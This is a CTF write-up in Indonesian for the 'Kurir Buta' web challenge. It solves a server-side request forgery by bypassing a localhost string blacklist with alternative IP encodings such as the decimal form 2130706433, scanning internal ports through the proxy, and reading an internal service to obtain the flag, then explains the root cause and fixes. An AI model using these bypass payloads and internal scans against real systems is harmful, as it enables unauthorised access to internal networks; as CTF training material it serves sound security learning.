# Writeup — Kurir Buta

| | |
|---|---|
| **Challenge** | Kurir Buta |
| **Kategori** | Web Exploitation — Server-Side Request Forgery (SSRF) |
| **Poin** | 750 |
| **Event** | TechtonicExpo CTF |
| **Kode Tim** | D35D4ECD |
| **Service** | `http://168.110.219.59:5009/` |
| **Flag** | `TechtonicExpoCTF{jalur_dalam_buta_D35D4ECD}` |

---

## Deskripsi

> Seorang kurir buta setia mengantarkan apa pun yang kamu minta. Satu-satunya ketakutannya: alamat yang terlihat lokal. Ia menolak mentah-mentah jika namanya mengandung kata yang mencurigakan.
>
> Tapi kurir ini tidak terlalu pintar. Ia hanya membandingkan huruf-huruf yang terlihat, tidak pernah memahami angka. Alamat yang sama punya banyak cara untuk ditulis, dan kurir hanya kenal satu.
>
> Di dalam rumah, jauh dari mata luar, ada sebuah pesan yang hanya bersedia dibaca oleh mereka yang datang dari dalam. Arahkan kurir ke sana dengan wajah yang tidak dikenalnya.
>
> **Cara pakai:** Kirim permintaan lewat `/proxy?url=...`

Petunjuk yang sangat gamblang:
- "kurir mengantarkan apa pun yang kamu minta" + `/proxy?url=` → **SSRF**.
- "menolak alamat yang terlihat lokal" → ada **blacklist** untuk `localhost`/`127.0.0.1`.
- "hanya membandingkan huruf, tidak memahami angka" + "alamat sama punya banyak cara ditulis" → bypass dengan **representasi IP alternatif (numerik)**.
- "pesan yang hanya bisa dibaca dari dalam rumah" → ada **service internal** yang hanya bisa diakses dari localhost.

---

## 1. Reconnaissance

```bash
curl -s http://168.110.219.59:5009/
# ... form/petunjuk: Kirim permintaan lewat /proxy?url=...
```

Uji perilaku proxy:

```bash
# External → berhasil di-fetch (proxy beneran meneruskan request)
curl -s "http://168.110.219.59:5009/proxy" --get --data-urlencode "url=http://example.com"
# -> <h1>Example Domain</h1> ...

# Lokal → ditolak
curl -s "http://168.110.219.59:5009/proxy" --get --data-urlencode "url=http://127.0.0.1/"
# -> "Kurir menolak alamat itu. Terlalu terlihat lokal."
curl -s "http://168.110.219.59:5009/proxy" --get --data-urlencode "url=http://localhost/"
# -> "Kurir menolak alamat itu. Terlalu terlihat lokal."
```

→ Blacklist berbasis string terhadap `127.0.0.1` dan `localhost`.

---

## 2. Bypass Filter — Representasi IP Alternatif

Alamat `127.0.0.1` bisa ditulis dalam banyak bentuk yang secara string berbeda tapi diresolusi ke IP yang sama:

| Bentuk | Contoh |
|---|---|
| **Desimal (integer 32-bit)** | `http://2130706433/` |
| Heksadesimal | `http://0x7f000001/` |
| Oktal | `http://0177.0.0.1/` |
| Singkat | `http://127.1/` |
| IPv6 loopback | `http://[::1]/` |
| Zero | `http://0/` |

`127.0.0.1` → `127*256^3 + 0 + 0 + 1 = 2130706433`. Karena filter "tidak memahami angka", bentuk desimal lolos:

```bash
curl -s "http://168.110.219.59:5009/proxy" --get \
  --data-urlencode "url=http://2130706433:5009/"
# -> <title>Kurir Buta</title> ...  (BERHASIL nyambung ke localhost, tidak ditolak)
```

Bypass berhasil. ✅

---

## 3. Menemukan "Pesan dari Dalam"

Endpoint `/flag` dan berbagai path di port 5009 hanya menghasilkan **404**:

```bash
curl -s "http://168.110.219.59:5009/proxy" --get \
  --data-urlencode "url=http://2130706433:5009/flag"
# -> 404 Not Found
```

Berarti pesannya ada di **service internal pada port lain** yang tidak diekspos keluar. Lakukan port-scan localhost lewat SSRF:

```bash
for port in 80 3000 5000 5010 8000 8080 8888 9000 1337; do
  curl -s "http://168.110.219.59:5009/proxy" --get \
    --data-urlencode "url=http://2130706433:$port/"
done
```

Hampir semua mengembalikan halaman "Kurir Buta", **kecuali port 8080** yang membalas string berbeda:

```
jalur_dalam_buta
```

Verifikasi bahwa service ini memang **hanya dari dalam** — akses langsung dari luar gagal:

```bash
curl -s http://168.110.219.59:8080/     # kosong / tidak terjangkau
```

---

## 4. Exploitation Final

```bash
curl -s "http://168.110.219.59:5009/proxy" --get \
  --data-urlencode "url=http://2130706433:8080/"
# -> jalur_dalam_buta
```

Payload (di UI, isi field `url`):

```
http://2130706433:8080/
```

---

## 5. Flag

Kunci dari service internal: `jalur_dalam_buta`. Sesuai format `TechtonicExpoCTF{kunci_KODETIM}` dengan kode tim `D35D4ECD`:

```
TechtonicExpoCTF{jalur_dalam_buta_D35D4ECD}
```

---

## 6. Root Cause & Remediation

**Penyebab:** validasi anti-SSRF hanya berupa pencocokan string (`"127.0.0.1"`, `"localhost"`) pada URL mentah — tidak me-resolve dan memeriksa IP tujuan yang sebenarnya.

**Perbaikan:**
- Resolve hostname ke IP **dulu**, lalu tolak jika masuk rentang privat/loopback (`127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16`, `::1`, dll) — bukan mencocokkan string.
- Waspadai semua bentuk penulisan IP (desimal/oktal/hex/IPv6/IPv4-mapped) dan **DNS rebinding**; validasi IP hasil koneksi, bukan hanya hostname.
- Terapkan **allowlist** domain/skema tujuan bila memungkinkan, blokir redirect ke alamat internal, dan batasi port.

---
*Writeup dibuat untuk TechtonicExpo CTF — kategori Web / SSRF.*
